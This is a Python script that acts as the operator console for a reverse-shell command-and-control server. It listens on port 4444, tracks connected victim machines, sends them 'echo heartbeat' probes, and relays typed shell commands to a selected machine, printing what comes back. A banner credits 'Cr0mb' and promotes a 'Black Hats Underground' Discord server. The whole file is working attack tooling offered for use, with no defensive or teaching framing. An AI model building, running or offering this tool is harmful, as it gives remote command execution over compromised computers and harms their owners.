import socket
import threading
import time
import os
from colorama import init, Fore
init(autoreset=True)

HOST = "0.0.0.0"
PORT = 4444
HEARTBEAT_INTERVAL = 4
MAX_RETRIES = 500
RETRY_DELAY = 2

clients = {}
lock = threading.Lock()

def handle_client(client_socket, addr):
    client_id = f"{addr[0]}:{addr[1]}"
    
    with lock:
        clients[client_id] = client_socket

def interact_with_client(client_socket, client_id):
    try:
        while True:
            try:
                command = input(f"{client_id} > ").strip()
            except KeyboardInterrupt:
                print("\n[+] Returning to main menu...")
                return

            if command.lower() in ["exit", "quit"]:
                print("[+] Returning to main menu...")
                return

            if command:
                client_socket.send(command.encode())
                output = client_socket.recv(4096).decode(errors='ignore')
                print(output)

    except Exception as e:
        with lock:
            if client_id in clients:
                del clients[client_id]
        client_socket.close()

def heartbeat_check():
    while True:
        time.sleep(HEARTBEAT_INTERVAL)
        to_remove = []

        with lock:
            for client_id, client_socket in list(clients.items()):
                try:
                    client_socket.send(b"echo heartbeat")
                    response = client_socket.recv(1024).decode(errors='ignore')
                    if "heartbeat" not in response:
                        raise Exception("No heartbeat response")
                except:
                    to_remove.append(client_id)

            for client_id in to_remove:
                del clients[client_id]

def clear_screen():
    system = os.name
    if system == 'nt':
        os.system('cls')
    else:
        os.system('clear')
        
def main_menu():
    while True:
        try:
            print("     ||========================||    ||==============================||")
            print(Fore.LIGHTRED_EX + "     ||      Made by Cr0mb     ||    ||       github.com/Cr0mb       ||")
            print("     ||========================||    ||==============================||")
            print(Fore.YELLOW +"     || Black Hats Underground ||    ||https://discord.gg/cFctBRnBpc ||")
            print("     ||========================||    ||==============================||\n\n")
            command = input("\n[Main Menu] Enter command (list, select <id>, clear, quit): ").strip()
        except KeyboardInterrupt:
            print("\n[*] Server shutting down...")
            return

        if command.lower() == "list":
            with lock:
                if not clients:
                    clear_screen()
                    print("[-] No active clients.")
                else:
                    clear_screen()

                    print("Active Clients:")
                    for idx, client in enumerate(reversed(list(clients.keys())), start=1):
                        print(f"{idx}. {client}")

        elif command.lower().startswith("select "):
            selection = command.split(" ", 1)[1]
            
            with lock:
                client_list = list(clients.keys())

            if selection.isdigit():
                selection_idx = int(selection) - 1
                if 0 <= selection_idx < len(client_list):
                    selected_id = client_list[selection_idx]
                else:
                    print("[-] Invalid client index")
                    continue
            else:
                selected_id = selection

            if selected_id in clients:
                print(f"[+] Switched to {selected_id}")
                interact_with_client(clients[selected_id], selected_id)
            else:
                print("[-] Invalid client ID")

        elif command.lower() == "clear":
            clear_screen()

        elif command.lower() in ["exit", "quit"]:
            print("[*] Exiting server...")
            return

        else:
            print("[-] Invalid command. Use 'list', 'select <id>', 'clear', or 'quit'.")

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    retries = 0
    while retries < MAX_RETRIES:
        try:
            server.bind((HOST, PORT))
            break
        except OSError as e:
            retries += 1
            if retries >= MAX_RETRIES:
                print(Fore.RED + f"[ERROR] Could not bind to {HOST}:{PORT} after {MAX_RETRIES} retries.")
                return
            print(Fore.YELLOW + f"[WARNING] Address {HOST}:{PORT} is already in use. Retrying in {RETRY_DELAY} seconds...")
            time.sleep(RETRY_DELAY)

    server.listen(5)
    print(f"[*] Listening on {HOST}:{PORT}")

    while True:
        client_socket, addr = server.accept()
        with lock:
            clients[f"{addr[0]}:{addr[1]}"] = client_socket
        threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()

if __name__ == "__main__":
    try:
        threading.Thread(target=start_server, daemon=True).start()
        threading.Thread(target=heartbeat_check, daemon=True).start()
        main_menu()
    except KeyboardInterrupt:
        print("\n[*] Server shutting down...")
